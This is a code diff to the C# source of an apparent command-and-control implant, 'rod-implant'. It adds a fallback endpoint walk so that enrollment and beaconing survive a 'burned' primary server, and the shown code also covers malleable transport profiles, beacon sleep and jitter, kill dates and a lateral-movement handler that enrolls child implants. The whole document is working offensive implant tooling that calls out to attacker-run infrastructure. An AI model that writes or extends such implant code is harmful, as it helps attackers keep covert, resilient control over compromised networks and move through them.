@@ -58,16 +58,17 @@ internal static class ImplantApp
 
         var serverCAs = CACertLoader.LoadOptional(config.CACertPath);
 
-        // The malleable transport profile (architecture.md Sec 7) shapes the
-        // enroll request: a profiled enroll path, User-Agent, custom headers, a
-        // per-request timeout, and an optional base64 body envelope. The enroll URL
-        // carries the profile's path; the profile carries the rest.
-        var enrollUrl = config.ResolvedEnrollURL();
-        Console.Error.WriteLine($"rod-implant: enrolling at {enrollUrl}");
+        // The egress walk (architecture.md Sec 8): the primary endpoint plus the
+        // baked fallbacks, shared by enroll and beacon so the entry that answers
+        // enroll is the entry the first check-in dials. A dead primary walks to
+        // the next entry at both stages; the enrolled leaf -- the identity the
+        // listener sees -- never changes across the walk.
+        var egress = EgressEndpoints.Of(config);
+
         Enrollment enrollment;
         try
         {
-            enrollment = await EnrollWithRetryAsync(enrollUrl, config, privateKey, serverCAs, cts.Token);
+            enrollment = await EnrollWithRetryAsync(egress, config, privateKey, serverCAs, cts.Token);
         }
         catch (Exception ex)
         {
@@ -76,25 +77,24 @@ internal static class ImplantApp
         }
         Console.Error.WriteLine($"rod-implant: enrolled: implant={enrollment.ImplantId} engagement={enrollment.EngagementId}");
 
-        var beaconUrl = config.BeaconURL;
-        if (beaconUrl.Length == 0)
-            beaconUrl = Endpoints.BeaconUrlFromEnroll(config.EnrollURL);
-
         // The lateral.move handler re-enrolls a child against the same enroll path,
         // naming this implant as parent (architecture.md Sec 10.1). Carry the enroll
         // inputs and the parent's own id into the beacon's handler registry so a
         // can derive a child that enrolls back. The child's stager token arrives in
         // the task arguments, not here: this implant's own token is already spent.
+        // The bundle's URL is the walk's current entry -- the front that just
+        // answered enroll -- so a child derived while the primary is burned
+        // enrolls at a live front.
         var enroll = new EnrollBundle
         {
-            Url = enrollUrl,
+            Url = Config.ResolveEnrollUrl(egress.CurrentEnrollUrl, config.Transport),
             ParentId = enrollment.ImplantId,
             Profile = config.Transport,
             CAs = serverCAs,
         };
 
         var beacon = new Beacon(
-            config.Mode, beaconUrl, enrollment.ImplantId, enrollment.Leaf, enrollment.PrivateKey, enrollment.CAs,
+            config.Mode, egress, enrollment.ImplantId, enrollment.Leaf, enrollment.PrivateKey, enrollment.CAs,
             config.Sleep, config.Jitter, config.HasKillDate ? config.KillDate : null, enroll,
             config.ClassVerbs, Console.Error);
         try
@@ -117,9 +117,11 @@ internal static class ImplantApp
     // Enrolls with bounded retries: a transient failure (teamserver restarting,
     // network flap) backs off exponentially, while a definitive rejection (bad,
     // spent, or expired token, malformed response) fails immediately -- retrying
-    // would not change that answer.
+    // would not change that answer. Each retry advances the egress walk
+    // (architecture.md Sec 8), so a burned primary is left behind on the first
+    // failure rather than retried until the attempt budget is gone.
     private static async Task<Enrollment> EnrollWithRetryAsync(
-        string enrollUrl,
+        EgressEndpoints egress,
         Config config,
         RSA privateKey,
         X509Certificate2Collection? serverCAs,
@@ -128,8 +130,12 @@ internal static class ImplantApp
         const int maxAttempts = 5;
         for (var attempt = 1; ; attempt++)
         {
+            // The malleable transport profile (architecture.md Sec 7) shapes each
+            // attempt: the current entry's host with the profiled enroll path.
+            var enrollUrl = Config.ResolveEnrollUrl(egress.CurrentEnrollUrl, config.Transport);
             try
             {
+                Console.Error.WriteLine($"rod-implant: enrolling at {enrollUrl}");
                 return await C2.EnrollAsync(
                     enrollUrl, config.StagerToken, parentImplantId: null, privateKey, serverCAs, config.Transport, cancellationToken: cancellationToken);
             }
@@ -146,6 +152,7 @@ internal static class ImplantApp
                 if (attempt == maxAttempts)
                     throw;
                 Console.Error.WriteLine($"rod-implant: enroll attempt {attempt} failed: {ex.Message}; retrying");
+                egress.Advance();
                 try
                 {
                     await Task.Delay(TimeSpan.FromSeconds(Math.Pow(2, attempt)), cancellationToken);
@@ -241,6 +248,15 @@ internal static class BakedProfileSupport
             && Environment.GetEnvironmentVariable("ROD_HEADERS") is null)
         {
             Environment.SetEnvironmentVariable("ROD_HEADERS", headers.GetRawText());
+        }
+        // The fallback endpoint list rides as a nested array, the same verbatim
+        // pass-through (architecture.md Sec 8): ROD_FALLBACK_ENROLL_URLS decodes
+        // the JSON array back into the ordered walk.
+        if (root.TryGetProperty("fallbackEnrollURLs", out var fallbacks)
+            && fallbacks.ValueKind == System.Text.Json.JsonValueKind.Array
+            && Environment.GetEnvironmentVariable("ROD_FALLBACK_ENROLL_URLS") is null)
+        {
+            Environment.SetEnvironmentVariable("ROD_FALLBACK_ENROLL_URLS", fallbacks.GetRawText());
         }
     }
 
